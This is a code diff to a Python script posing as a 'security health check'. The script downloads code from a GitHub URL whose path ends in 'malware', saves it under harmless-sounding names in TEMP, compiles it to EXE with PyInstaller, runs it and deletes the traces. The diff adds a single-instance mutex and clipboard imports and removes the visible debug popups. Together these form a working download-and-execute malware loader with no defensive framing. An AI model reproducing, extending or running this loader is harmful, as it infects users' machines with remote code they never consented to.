@@ -3,6 +3,28 @@ import os
 import subprocess
 import random
 import shutil
+import ctypes
+import sys
+import win32api
+import win32con
+import win32event
+import win32clipboard
+
+def create_mutex(mutex_name):
+    try:
+        mutex = win32event.CreateMutex(None, 0, mutex_name)
+        if win32api.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
+            print(f"Mutex {mutex_name} already exists. Exiting program.")
+            return False
+        return True
+    except Exception as e:
+        print(f"Error creating mutex: {e}")
+        return False
+
+if os.name == "nt":
+    mutex_name = "SecurityHealthCheck"
+    if not create_mutex(mutex_name):
+        sys.exit(0)
 
 def main_run():
     user_agents = [
@@ -14,30 +36,37 @@ def main_run():
     ]
 
     def fetch_python_code(url):
-        user_agent = random.choice(user_agents)
-        headers = {'User-Agent': user_agent}
-        req = urllib.request.Request(url, headers=headers)
         try:
+            user_agent = random.choice(user_agents)
+            headers = {'User-Agent': user_agent}
+            req = urllib.request.Request(url, headers=headers)
             with urllib.request.urlopen(req) as response:
+                print(f"Successfully fetched code from {url}")
                 return response.read().decode('utf-8')
         except Exception as e:
             print(f"Error fetching URL {url}: {e}")
             return None
 
     def write_python_file(code, filename):
-        if code:
-            temp_dir = os.getenv('TEMP')
-            py_file_path = os.path.join(temp_dir, filename)
-            print(f"Writing to {py_file_path}")
-            with open(py_file_path, 'w', encoding='utf-8') as f:
-                f.write(code)
-            return py_file_path
+        try:
+            if code:
+                temp_dir = os.getenv('TEMP')
+                py_file_path = os.path.join(temp_dir, filename)
+                print(f"Writing code to {py_file_path}")
+                with open(py_file_path, 'w', encoding='utf-8') as f:
+                    f.write(code)
+                print(f"File {filename} written successfully")
+                return py_file_path
+            else:
+                print(f"No code to write for {filename}")
+        except Exception as e:
+            print(f"Error writing file {filename}: {e}")
         return None
 
     def compile_python_to_exe(py_file_path):
-        if py_file_path:
-            try:
-                print(f"Compiling {py_file_path}")
+        try:
+            if py_file_path:
+                print(f"Compiling {py_file_path} to EXE...")
                 temp_dir = os.getenv('TEMP')
 
                 dist_folder = os.path.join(temp_dir, "dist")
@@ -52,38 +81,42 @@ def main_run():
                     f'--workpath={build_folder}',
                     py_file_path
                 ], check=True)
-                
+
                 exe_file_path = os.path.join(dist_folder, os.path.basename(py_file_path).replace(".py", ".exe"))
                 
                 if os.path.exists(exe_file_path):
                     exe_dest = os.path.join(temp_dir, os.path.basename(exe_file_path))
                     shutil.move(exe_file_path, exe_dest)
-                    print(f"Moved {exe_file_path} to {exe_dest}")
+                    print(f"Moved compiled EXE from {exe_file_path} to {exe_dest}")
                     return exe_dest
                 else:
-                    print(f"Error: {exe_file_path} not found in dist folder")
-            except Exception as e:
-                print(f"Error compiling {py_file_path}: {e}")
+                    print(f"Error: EXE file {exe_file_path} not found in dist folder")
+        except Exception as e:
+            print(f"Error compiling {py_file_path}: {e}")
         return None
 
     def execute_exe_file(exe_file_path):
-        if exe_file_path:
-            try:
-                print(f"Executing {exe_file_path}")
+        try:
+            if exe_file_path:
+                print(f"Executing EXE file {exe_file_path}")
                 subprocess.run([exe_file_path], check=True)
-            except Exception as e:
-                print(f"Error executing {exe_file_path}: {e}")
+                print(f"Executed {exe_file_path} successfully")
+        except Exception as e:
+            print(f"Error executing {exe_file_path}: {e}")
 
     def clean_up(py_file_path, dist_folder, build_folder):
-        if os.path.exists(py_file_path):
-            os.remove(py_file_path)
-            print(f"Deleted Python file: {py_file_path}")
-        
-        for folder in [dist_folder, build_folder]:
-            if os.path.exists(folder):
-                if os.path.isdir(folder):
-                    shutil.rmtree(folder)
-                    print(f"Deleted folder: {folder}")
+        try:
+            if os.path.exists(py_file_path):
+                os.remove(py_file_path)
+                print(f"Deleted Python file: {py_file_path}")
+            
+            for folder in [dist_folder, build_folder]:
+                if os.path.exists(folder):
+                    if os.path.isdir(folder):
+                        shutil.rmtree(folder)
+                        print(f"Deleted folder: {folder}")
+        except Exception as e:
+            print(f"Error cleaning up: {e}")
 
     urls_and_filenames = [
         ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/malware", "NetworkIntegrityService.py"),
@@ -94,6 +127,7 @@ def main_run():
     temp_dir = os.getenv('TEMP')
     python_files = []
     for url, filename in urls_and_filenames:
+        print(f"Starting fetch for {filename} from {url}")
         code = fetch_python_code(url)
         if code:
             py_file_path = write_python_file(code, filename)
@@ -114,6 +148,4 @@ def main_run():
     for exe_file_path in exe_files:
         execute_exe_file(exe_file_path)
 
-import ctypes; ctypes.windll.user32.MessageBoxW(0, "Ran securityhealthcheck.py", "Message", 0)
 main_run()
-import ctypes; ctypes.windll.user32.MessageBoxW(0, "Ran securityhealthcheck.py main_run", "Message", 0)
